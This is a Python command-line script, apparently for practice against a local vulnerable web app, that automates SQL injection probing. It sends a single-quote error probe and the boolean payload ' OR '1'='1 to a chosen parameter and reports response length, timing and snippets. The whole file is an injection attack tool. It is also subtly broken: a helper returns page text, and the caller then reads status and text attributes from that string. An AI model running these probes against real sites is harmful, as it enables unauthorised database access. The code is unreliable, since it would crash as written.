import requests
import argparse
import time


class SQLiAutomator:

    def __init__(self, url, method="GET", data=None):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.session = requests.Session()
        self.baseline = self.send_request(self.data)

    def send_request(self, params):
        if self.method == "GET":
            response = self.session.get(self.url, params=params)
        else:
            response = self.session.post(self.url, data=params)
        return response.text
    
    def test_payloads(self, param, payloads):
        results = []
        for payload in payloads:
            test_params = self.data.copy()
            test_params[param] = payload
            start = time.time()
            response = self.send_request(test_params)
            elapsed = time.time() - start


            results.append({
                "payload": payload,
                "status": response.status_code,
                "length": len(response.text),
                "time": elapsed,
                "snippet": response.text[:120]
            })
        return results
    
def main():

    parser = argparse.ArgumentParser(description="Simple SQLi automation tool (lab use only!)")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. http://localhost:8080/vulnerabilities/sqli/)")
    parser.add_argument("-p", "--param", required=True, help="Parameter name to test (e.g. id)")
    parser.add_argument("-v", "--value", required=True, help="Normal parameter value (e.g. 1)")
    parser.add_argument("-m", "--method", default="GET", help="HTTP method: GET or POST (default=GET)")

    args = parser.parse_args()
    
    base_data = {args.param: args.value}
    tester = SQLiAutomator(args.url, method=args.method, data=base_data)

    payloads = [
        args.value,                  # baseline
        args.value + "'",            # error-based probe
        args.value + "' OR '1'='1",  # boolean-based probe
    ]

    results = tester.test_payloads(args.param, payloads)

    print("\n=== Results ===")
    for r in results:
        print(f"Payload: {r['payload']} | "
              f"Len: {r['length']} | "
              f"Time: {r['time']:.2f}s | "
              f"Snippet: {r['snippet']}")


if __name__ == "__main__":
    main()